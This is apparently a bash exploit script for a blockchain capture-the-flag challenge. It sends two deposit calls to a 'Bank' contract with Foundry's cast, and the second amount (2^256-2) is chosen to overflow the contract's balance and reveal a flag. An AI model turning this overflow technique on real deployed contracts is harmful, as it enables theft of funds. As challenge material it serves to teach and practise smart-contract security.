#!/usr/bin/env bash
set -euo pipefail

if ! command -v cast >/dev/null 2>&1; then
    printf 'Error: cast is not installed. Install Foundry, then run this script again.\n' >&2
    exit 1
fi

read -r -p 'RPC URL: ' RPC_URL
read -r -s -p 'Fresh challenge private key (input hidden): ' PRIVATE_KEY
printf '\n'
read -r -p 'Bank address: ' BANK_ADDRESS
read -r -p 'Your address: ' YOUR_ADDRESS
read -r -p 'Second deposit amount (uint256; default triggers overflow from zero balance): ' AMOUNT
AMOUNT=${AMOUNT:-0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe}

ACCOUNT_FROM_KEY=$(cast wallet address "$PRIVATE_KEY")
if [[ "${ACCOUNT_FROM_KEY,,}" != "${YOUR_ADDRESS,,}" ]]; then
    printf 'Error: the private key does not match Your Address.\n' >&2
    unset PRIVATE_KEY
    exit 1
fi

if [[ "$AMOUNT" != '0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe' ]]; then
    printf 'Warning: this amount will not trigger the overflow when the internal balance starts at zero.\n'
fi

printf '\nThe next two transactions send no ETH value; they use ETH only for gas.\n'
printf 'Gas estimation and preliminary eth_call checks are skipped for compatibility with this RPC node.\n'
read -r -p 'Continue with deposit(2), then deposit(amount)? [y/N] ' CONFIRM
if [[ ! "$CONFIRM" =~ ^[Yy]$ ]]; then
    unset PRIVATE_KEY
    printf 'Cancelled.\n'
    exit 0
fi

cast send --rpc-url "$RPC_URL" --private-key "$PRIVATE_KEY" \
    --gas-limit 100000 "$BANK_ADDRESS" 'deposit(uint256)' 2
cast send --rpc-url "$RPC_URL" --private-key "$PRIVATE_KEY" \
    --gas-limit 100000 "$BANK_ADDRESS" 'deposit(uint256)' "$AMOUNT"

unset PRIVATE_KEY
printf '\nBoth transactions were submitted successfully. Check their receipts and the challenge page for the revealed flag.\n'
